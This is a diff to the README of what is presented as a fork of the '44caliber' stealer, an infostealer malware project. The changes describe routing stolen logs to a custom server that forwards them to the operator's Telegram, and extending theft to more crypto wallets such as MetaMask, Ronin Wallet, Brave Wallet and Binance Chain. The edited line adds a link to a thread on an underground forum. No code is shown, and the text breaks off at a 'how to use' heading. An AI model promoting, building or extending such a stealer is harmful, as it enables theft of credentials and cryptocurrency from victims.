@@ -2,7 +2,7 @@
 44caliber stealer by khainaaeh but with server and some more crypto wallets
 
 changes:
-- sending to discord replaced with sending to custom server (/server) and then server sends log to your telegram
+- sending to discord replaced with sending to custom server (/server) and then server sends log to your telegram (server based on my previous project https://lolz.guru/threads/2361390/)
 - added some more crypto wallets (metamask, roninwallet, bravewallet, binancechain)
 
 how to use:
